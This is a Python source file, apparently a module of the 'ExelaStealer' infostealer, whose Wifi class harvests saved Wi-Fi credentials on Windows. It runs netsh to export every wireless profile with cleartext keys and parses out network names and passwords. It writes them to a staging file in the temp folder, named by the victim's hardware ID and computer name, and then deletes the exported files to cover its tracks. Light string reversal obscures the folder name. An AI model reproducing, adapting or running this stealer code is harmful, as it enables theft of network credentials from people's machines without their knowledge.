import subprocess, os, genHwid, sys

serialNumber = genHwid.Gen().get_hwid_number() 
name = os.getenv("computername")


class Wifi:
    def __init__(self) -> None:
        self.wifi_files = []
        self.wifi_name = []
        self.wifi_password = []
        self.createFile()
        self.quicaxd = "ifiW"[::-1]
        self.Run()
        for q in self.wifi_files:
            os.remove(q)
    def Run(self):
        subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True)
        for filename in os.listdir(os.getcwd()):
            if filename.startswith('Wi-Fi') and filename.endswith('.xml'):
               self.wifi_files.append(filename)
               for i in self.wifi_files:
                   with open(i, "r") as f:
                       for line in f.readlines():
                           if 'name' in line:
                               striped = line.strip()
                               front = striped[6:]
                               if (front[:-7] in self.wifi_name):
                                   continue
                               else:
                                   self.wifi_name.append(front[:-7])
                           if 'keyMaterial' in line:
                               striped = line.strip()
                               front = striped[13:]
                               if (front[:-14] in self.wifi_password):
                                   continue
                               else:
                                   self.wifi_password.append(front[:-14])
                               for x, y in zip(self.wifi_name, self.wifi_password):
                                   sys.stdout = open(os.getenv("temp") + f"\\{serialNumber}__{name}\\{self.quicaxd}\\{self.quicaxd}.txt", "a")
                                   print("Wifi Name : " + x + ", ", "Password : " + y)
                                   sys.stdout.close()
                                   
    def createFile(self):
        oups = "ifiW"[::-1]
        path = os.getenv("temp") + f"\\{serialNumber}__{name}\\{oups}"
        if os.path.isfile(path):
            try:
                file = open(path + f"\\{oups}.txt", "w")
                file.write("---------https://t.me/ExelaStealer---------\n==================================================\n")
                file.close()
            except Exception as e:
                pass          
        else:
            try:
                os.mkdir(path)
                file = open(path + f"\\{oups}.txt", "w")
                file.write("---------https://t.me/ExelaStealer---------\n==================================================\n")
                file.close()
            except:
                pass 
                        
